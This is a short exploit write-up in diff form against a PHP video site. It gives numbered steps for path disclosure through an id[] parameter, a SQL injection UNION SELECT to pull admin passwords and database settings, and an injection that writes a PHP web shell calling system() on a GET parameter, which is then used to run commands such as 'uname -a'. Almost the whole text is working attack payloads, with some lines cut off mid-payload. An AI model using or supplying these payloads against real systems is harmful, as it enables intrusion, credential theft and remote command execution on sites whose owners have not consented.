@@ -1,0 +1,17 @@
+FIND ADMIN PASS & DB INFO:
+1. We must have teh path .. check: 
+http://www.example.com/videos.php?id[]=
+(path disclosure)
+2.
+http://www.example.com/videos.php?id=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11$
+3. Now check: http://www.example.com/config.txt
+
+UPLOAD SHELL:
+1. We must have teh path .. check: 
+http://www.example.com/videos.php?id[]=
+(path disclosure)
+2.
+http://www.example.com/videos.php?id=-1%20UNION%20SELECT%201,'<?php%20system($_GET$
+3. http://www.example.com/shell.php?cmd=uname -a
+
+
